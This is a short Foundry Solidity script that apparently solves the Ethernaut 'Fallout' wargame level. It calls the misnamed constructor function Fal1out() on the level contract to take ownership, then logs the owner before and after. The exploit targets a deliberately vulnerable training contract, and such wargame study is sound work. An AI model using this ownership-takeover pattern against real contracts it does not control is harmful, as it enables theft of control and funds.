// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/FallOut.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallOutSolution is Script {
    Fallout level2 = Fallout(0xfCA18e3AA059f4c373Ff716F08082e7eFc97999E);

    function run() external {
        vm.startBroadcast();
        console.log("Current Owner is: ", level2.owner());
        level2.Fal1out();
        console.log("New Owner is: ", level2.owner());
        vm.stopBroadcast();
    }
}
